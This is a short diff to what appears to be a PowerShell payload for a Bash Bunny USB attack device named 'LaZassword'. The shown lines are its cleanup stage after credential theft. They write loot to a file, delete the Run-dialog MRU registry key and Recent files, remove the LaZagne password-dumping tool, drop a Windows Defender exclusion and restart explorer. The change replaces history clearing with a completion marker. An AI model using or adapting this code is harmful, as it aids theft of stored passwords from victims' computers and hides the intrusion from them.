@@ -10,7 +10,7 @@ $LPATH | Out-File -FilePath $LOOTFILE
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 Remove-Item "$BLABEL\lazagne\" -recurse
 Remove-MpPreference -ExclusionPath "$BLABEL"
-Clear-History
+New-Item -Path "$BLABEL\loot\LaZassword\done" -ItemType File 
 stop-process -Name explorer
 Get-ChildItem -Path C:\Users\\$env:UserName\AppData\Roaming\Microsoft\Windows\Recent -Include * -File -Recurse | foreach { $_.Delete()}
 $bb = (gwmi win32_volume -f 'label=''BASHBUNNY''').Name
